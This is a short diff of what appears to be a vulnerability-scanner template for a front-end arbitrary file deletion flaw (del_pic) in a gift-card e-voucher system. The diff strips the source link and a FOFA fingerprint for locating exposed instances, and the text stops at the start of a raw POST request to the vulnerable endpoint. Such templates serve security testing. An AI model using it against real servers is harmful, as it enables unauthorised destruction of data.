@@ -3,12 +3,8 @@ info:
   name: 礼品卡电子券收卡系统存在前台del_pic任意文件删除漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/slb7g8yof82oliu4'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: slb7g8yof82oliu4
-    fofa: Body="/Application/Home/Static/css/style2.css"
 http:
 - raw:
   - 'POST /Home/user/del_pic HTTP/1.1
